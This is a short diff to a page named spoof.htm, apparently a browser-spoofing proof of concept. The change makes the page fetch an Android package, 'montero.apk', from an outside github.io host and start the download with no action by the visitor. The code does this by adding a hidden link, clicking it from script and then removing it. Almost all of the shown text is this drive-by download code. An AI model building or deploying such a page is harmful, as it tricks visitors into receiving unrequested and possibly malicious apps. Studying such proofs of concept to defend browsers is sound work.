@@ -13,10 +13,13 @@ function sleep()
     document.write("123<br>");
 
     var link = document.createElement("a");
-    link.href = "app.apk";
-    link.download = "app.apk";
+    link.href = "https://lowleveljody.github.io/pocbrowseraja/montero.apk";
+    link.download = "montero.apk";
+    document.body.appendChild(link);
     link.click();
+    document.body.removeChild(link);
 }
+
 </script>
 
 spoof.htm
